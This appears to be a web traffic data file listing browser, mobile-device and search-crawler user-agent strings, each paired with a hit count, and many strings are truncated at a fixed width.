+0 2
+Mozilla/5.0 (Linux; Android 4.4.2; LenovoA3300-GV Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.
+0 1
+Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Sa
+0 179
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36
+0 252
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36
+0 3
+python-requests/2.2.1 CPython/2.7.6 Linux/3.16.0-33-generic
+0 1
+Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36
+0 1
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36
+0 3
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36
+0 17
+Mozilla/5.0 (Linux; U; Android 4.2.2; es-mx; OWN_S4025 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 Mobile
+0 1
+Mozilla/5.0 (Linux; U; Android 4.0.3; es-mx; LG-E612f Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile
+0 178
+Mozilla/5.0 (Linux; U; Android 4.2.2; es-mx; ONE TOUCH 4016A Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 
+0 3
+Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; MRA 4.6 (build 01425))
+0 1
+Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 630) like 
+0 87
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36
+0 1
+Mozilla/5.0 (Linux; U; Android 4.0.4; es-us; GT-S5301L Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobil
+0 2
+Mozilla/5.0 (compatible; WbSrch/1.0; +https://wbsrch.com)
+0 1
+Mozilla/5.0 (Linux; Android 4.3; Z730 Build/JLS36C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/
+0 1
+Mozilla/5.0 (Linux; Android 4.4.4; SM-G530H Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile S
+0 181
+Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36
+0 276
+Mozilla/4.0 (compatible;)
+0 46
+Googlebot-Image/1.0
+0 144
+Mozilla/5.0 (Linux; Android 4.4.4; XT1021 Build/KXC21.5-40) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile
+0 107
+Mozilla/5.0 (Linux; U; Android 4.1.2; es-es; GT-I8190L Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobil
+0 1
+Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36
+0 842
+Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0
+0 1
+Mozilla/5.0 (Macintosh; PPC Mac OS X 10_6_7) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.790.0 Safari/535.1
+0 1
+Mozilla/5.0 (compatible; SeznamBot/3.2; +http://fulltext.sblog.cz/)
+0 36
+Dalvik/1.6.0 (Linux; U; Android 4.2.2; ILIUM S620 Build/JDQ39)
+0 2
+Mozilla/5.0 (Linux; U; Android 4.2.2; es-us; TR10CS1 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/5
+0 4
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.3
+0 4
+Mozilla/5.0 (Linux; Android 4.4.2; SGH-M919V Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile 
+0 86
+Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)
+0 1
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.5
+0 4
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36
+0 993
+Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; ASU2JS; rv:11.0) like Gecko
+0 1
+Mozilla/5.0 (Linux; U; Android 5.0; es-sa; LG-D855 Build/LRX21R.A1421650137) AppleWebKit/537.36 (KHTML, like Gecko) Version/4
+0 93
+Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/5.2.43972 Mobile/12B466 Safari/600
+0 2
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.94 Safari/537.36
+0 1
+Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 1.
+0 4
+Mozilla/5.0 (Linux; Android 4.4.4; XT1058 Build/KXA21.12-L1.29.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 
+0 187
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36
+0 12
+Mozilla/5.0 (iPad; CPU OS 8_1_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B435 Safari/600.1
+0 2
+Mozilla/5.0 (Linux; U; Android 2.3.6; es-us; ONE TOUCH 4007A Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 
+0 1
+Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2
+0 1
+Mozilla/5.0 (Linux; Android 4.4.2; Z970 Build/KVT49L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobi
+0 1
+Mozilla/5.0 (Linux; U; Android 4.4.4; es-es; GT-I9060I Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobil
+0 2
+Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MASMJS; rv:11.0) like Gecko
+0 1
+Mozilla/5.0 (iPhone; CPU iPhone OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12D508 Safar
+0 516
+Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safa
+0 59
+Mozilla/5.0 (Linux; U; Android 4.2.2; es-es; ALCATEL ONE TOUCH 7041X Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Vers
+0 1
+MailChimp.com
+0 4
+Mozilla/5.0 (Linux; Android 4.4.2; es-us; ILIUM S106 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/
+0 2
+Mozilla/5.0 (Linux; U; Android 4.2.2; es-us; ZTE Blade L2 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mob
+0 2
+Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.110 Safari/537.36
+0 27
+Mozilla/5.0 (Linux; Android 4.1.2; C1904 Build/15.1.A.1.9) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.58 Mobile 
+0 206
+Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
+0 2
+Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) CriOS/41.0.2272.58 Mobile/11
+0 1
+Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+0 777
+Mozilla/5.0 (Linux; U; Android 4.4.2; es-mx; SonyD2306 Build/18.3.C.0.40) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 
+0 117
+Mozilla/5.0 (compatible; Genieo/1.0 http://www.genieo.com/webfilter.html)
+0 21
+Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)
+0 5
+Mozilla/5.0 (Linux; Android 4.4.2; SM-T705M Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.109 Safari/
+0 1
+Mozilla/5.0 (Linux; U; Android 2.3.5; es-us; GT-S5830L Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 M
+0 108
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36
+0 1
+Baiduspider
+0 1
+Mozilla/5.0 (Linux; Android 4.4.2; LG-D805 Build/KOT49I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Sa
+0 129
+Mozilla/5.0 (Linux; Android 4.4.2; D2303 Build/18.3.C.0.39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile
+0 1
+Mozilla/5.0 (Linux; Android 4.4.2; Blade G Lux Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobil
+0 87
+Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Mobile/11D257
+0 9
+Mozilla/5.0 (Windows NT 6.3; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
+0 2
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.2)
+0 1
+Mozilla/5.0 (Linux; Android 4.4.2; SM-G900M Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 
+0 1
+Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.5 Safari/537.36
+0 1
+Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)
+0 35
+Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36
+0 86
+Mozilla/5.0 (Linux; Android 4.4.2; GT-I9500 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 
+0 3
+Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; feed-id=9850326950150144286)
+0 7
+Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; fr; rv:1.9.0.3) Gecko/2008092414 Firefox/3.0.3
+0 2
+Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12B466
+0 10
+Mozilla/5.0 (Windows NT 5.1; rv:19.0) Gecko/20100101 Firefox/19.0
+0 2
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2356.0 Safari/537.36
+0 59
+Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; MRA 4.4 (build 01334); .NET CLR 1.1.4322)
+0 1
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_7) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.68 Safari/534.24
+0 1
+Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; ms-office; MSOffice 14)
+0 1
+Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36
+0 1
+Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)
+0 52
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CL
+0 1
+Mozilla/5.0 (Linux; U; Android 4.1.2; es-es; EK-5937 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile 
+0 1
+Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36
+0 1
+Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)
+0 22
+Mozilla/5.0 (compatible; archive.org_bot; Wayback Machine Live Record; +http://archive.org/details/archive.org_bot)
+0 1
+Mozilla/5.0 (iPad; CPU OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/5.2.43972 Mobile/12B440 Safari/600
+0 2
+Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MDDCJS; rv:11.0) like Gecko
+0 93
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.72 Safari/537.36
+0 3
+Dalvik/1.4.0 (Linux; U; Android 2.3.6; SAMSUNG-SGH-I997 Build/GINGERBREAD)
+0 3
+Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko
+0 3
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/11.04 Chromium/12.0.742.112 Chrome/12.0.742.112
+0 1
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36
+0 2
+Mozilla/5.0 (Linux; U; Android 4.1.2; es-mx; LT28i Build/6.2.B.0.211) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobi
+0 9
+Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile
+0 2
+Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537
+0 175
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CL
+0 2
+Mozilla/5.0 (Linux; U; Android 4.3; es-mx; SonyD2306 Build/18.0.C.1.15) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mo
+0 231
+Mozilla/5.0 (Linux; U; Android 4.2.2; es-mx; OWN S3010 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 Mobile
+0 1
+Mozilla/5.0 (Linux; Android 4.4.2; XT1021 Build/KXC20.82-13) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0
+0 1
+Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0
+0 102
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.65 Safari/537.36
+0 3
+Mozilla/5.0 (X11; CrOS x86_64 14.4.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2358.0 Safari/537.36
+0 38
+Dalvik/1.6.0 (Linux; U; Android 4.2.2; BLU STUDIO 5.0 II Build/JDQ39)
+0 1
+Mozilla/5.0 (Linux; Android 4.4.2; LG-D400 Build/KOT49I.V10a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobi
+0 1
+Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)
+0 139
+Mozilla/5.0 (Linux; U; Android 4.2.2; es-es; HP Slate 7 Plus Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 
+0 1
+Mozilla/5.0 (Linux; U; Android 4.2.2; es-mx; ALCATEL ONE TOUCH 7040A Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Vers
+0 1
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.46 Safari/536.5
+0 72
+facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
+0 129
+AdsBot-Google (+http://www.google.com/adsbot.html)
+0 38
+Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) CriOS/41.0.2272.58 Mobile/11
+0 184
+Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+0 2
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36
+0 6
+Dalvik/1.6.0 (Linux; U; Android 4.1.2; LG-E410g Build/JZO54K)
+0 4
+Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0
+0 332
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1; 360Spider(compatible; Ha
+0 1
+Mozilla/5.0 (Linux; U; Android 4.1.1; es-es; HUAWEI G510-0251 Build/HuaweiG510-0251) AppleWebKit/534.30 (KHTML, like Gecko) V
+0 1
+Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36
+0 353
+Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko
+0 99
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; Win64; x64; Trident/7.0; .NET4.0E; .NET4.0C; InfoPath.3; .NET CLR 3.5.3072
+0 1
+Mozilla/5.0 (Linux; Android 4.4.4; XT1032 Build/KXB21.14-L1.40) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mo
+0 96
+Mozilla/5.0 (Windows NT 6.2; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0
+0 2
+Mozilla/5.0 (Linux; U;Android 5.0; LG-D855 Build/LRX21R.A1421650137) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrom
+0 1
+Mozilla/5.0 (Linux; Android 4.4.2; SM-G313MU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.517 Mobile
+0 3
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.65 Safari/537.36
+0 89
+Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900T Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chr
+0 1
+Mozilla/4.0 (compatible; MSIE 6.0; Windows NT)
+0 1
+Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/9.0.1
+0 1
+Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)
+0 87
+Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MSAppHost/2.0; rv:11.0) like Gecko
+0 18
+Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; WOW64; Trident/5.0)
+0 2
+Dalvik/1.6.0 (Linux; U; Android 4.3; D2004 Build/20.0.A.1.12)
+0 1
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; AlexaToolbar/amzni-3.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3
+0 1
+Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) CriOS/40.0.2214.69 Mobile/11
+0 310
+Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/23.0
+0 2
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18
+0 91
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; BTRS113982; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET 
+0 1
+Baiduspider-image+(+http://www.baidu.com/search/spider.htm)\\nReferer: http://image.baidu.com/i?ct=503316480&z=0&tn=baiduimag
+0 3
+Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
+0 32
+Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0
+0 4
+Mozilla/5.0 (Windows NT 6.1; rv:35.0) Gecko/20100101 Firefox/35.0
+0 452
+Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko Firefox/11.0 (via ggpht.com GoogleImageProxy)
+0 64
+Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko
+0 3
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox/36.0
+0 359
+Mozilla/5.0 (iPad; CPU OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) GSA/3.2.1.25875 Mobile/10A8426 Safari/8
+0 1
+Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+0 11
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36
+0 4
+Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36
+0 1
+Mozilla/5.0 (Linux; Android 4.1.2; LG-E425g Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.109 Mobile 
+0 1
+Mozilla/5.0 (compatible; proximic; +http://www.proximic.com/info/spider.php)
+0 4
+Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0); 360Spider(compatible; HaosouSpider; http://www.haosou.com/he
+0 3
+Mozilla/5.0 (Linux; U; Android 4.1.2; es-cl; LG-E425g Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile
+0 1
+Mozilla/5.0 (Linux; Android 4.4.4; SM-G850M Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile S
+0 179
+Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36
+0 95
+Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Saf
+0 183
+Opera/9.80 (Android; Opera Mini/7.5.32195/36.1487; U; es) Presto/2.12.423 Version/12.16
+0 86
+Mozilla/5.0 (Linux; U; Android 4.2.2; es-sa; LG-D805 Build/JDQ39B) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 Mobile 
+0 87
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CL
+0 82
+Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36
+0 1
+Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0
+0 2
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2356.0 Safari/537.36
+0 24
+Mozilla/5.0 (Linux; U; Android 4.2.2; es-mx; ONE TOUCH 4033A Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 
+0 5
+Mozilla/5.0 (Linux; U; Android 4.2.1; es-us; LANIX ILIUM S700 Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.
+0 1
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36
+0 6
+Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36
+0 1
+Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0; MASMJS)
+0 4
+Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MALNJS; rv:11.0) like Gecko
+0 94
+Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36
+0 1
+LinkedInBot/1.0 (compatible; Mozilla/5.0; Jakarta Commons-HttpClient/4.3 +http://www.linkedin.com)
+0 2
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0
+0 2
+Mozilla/5.0 (compatible; DomainSigmaCrawler/0.1; +http://domainsigma.com/robot)
+0 1
+Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3
+0 5
+Mozilla/5.0 (Linux; Android 4.4.2; LG-D320 Build/KOT49I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.89 Mobile Sa
+0 1
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36
+0 6
+Mozilla/5.0 (Linux; U; Android 4.2.2; es-es; GT-I8200 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile 
+0 365
+Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36
+0 83
+Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CL
+0 1
+Mozilla/5.0 (Linux; U; Android 4.2.2; es-us; VT-MID738 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile
+0 2
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.66 Safari/537.36
+0 1
+Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)
+0 1
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:36.0) Gecko/20100101 Firefox/36.0
+0 1
+Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.8) Gecko/20050511 Firefox/1.0.4
+0 7
+Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0
+0 1
+Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36
+0 1
+Mozilla/5.0 (Linux; Android 4.2.2; b1-720 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.59 Safari/537.
+0 56
+Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36
+0 1
+Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)
+0 117
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36
+0 2
+Mozilla/5.0 (Linux; Android 4.4.2; verykool s5510 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.
+0 1
+Mozilla/5.0 (Windows NT 6.2; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0
+0 1
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.104 Safari/537.36
+0 75
+Mozilla/5.0 (Linux; U; Android 4.4.2; es-mx; D5106 Build/18.1.A.1.17) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobi
+0 28
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10
+0 85
+Mozilla/5.0 (Linux; Android 4.4.2; HTC Desire 510 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.
+0 3
+Mozilla/5.0 (Linux; Android 4.2.2; D90G21 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Safari/537.
+0 108
